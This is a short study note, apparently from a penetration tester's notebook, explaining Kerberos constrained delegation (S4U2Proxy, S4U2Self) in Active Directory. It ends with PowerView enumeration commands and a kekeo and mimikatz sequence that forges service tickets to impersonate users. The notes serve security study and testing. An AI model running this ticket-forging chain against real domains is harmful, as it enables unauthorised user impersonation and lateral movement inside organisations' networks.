- [[#Unconstrained Delegation]] is dangerous, as it allows services to impersonate user and access any service.
- S4U restricts this and only allows delegation to certain services.
	- Service for User to Proxy (S4U2Proxy)
	- Service for User to Self (S4U2Self)
- No TGT is required in this extention.
### S4U2Proxy
This extension allows a service to request another service on behalf of the user by using `ST` instead of `TGT`.
The service can only ask for impersonation `ST` for certain services defined in one of the following ways:
- **Classic Constrained Delegation**: `msDS-AllowedToDelegateTo` attribute of the service account. It contains [[Active Directory/AD Concepts/Services#SPN|SPN]] of the services for which the service account can ask ST for. To edit this parameter, `SeEnableDelegationPrivilege` priv is required.
- **Resource Based Constrained Delegation**: The service account is mentioned in the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of the target service for which the service account will ask ST for.
### S4U2Self
- Kerberos delegation when the client does not support Kerberos protocol. (Protocol Transition)
- In this scenario, the service which has the "TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION" flag set, can request a TGS for the another service for the user.
# Enumeration
- Enumerating users and computers which contrained delegation enabled
- Powerview:
```powershell
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
```
- Active Directory Module
```powershell
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDeleagateTo
```
# Exploitation
- Getting a TGT for the account that can delegate
```powershell
kekeo tgt::ask /user:svcIIS /domain:mydomain.local /password:Qwer1234.
# this will save the TGT file to the disk
# use this TGT to request TGS for the delegated service
kekeo tgs::s4u /tgt:<tgt_file> /user:<user_to_inpersonate> /service:<service_allowed_to_delegate_to>
# this will save the TGS to the disk
# we can load this ticket it memory
mimikatz kerberos::ptt <ticket_file>
```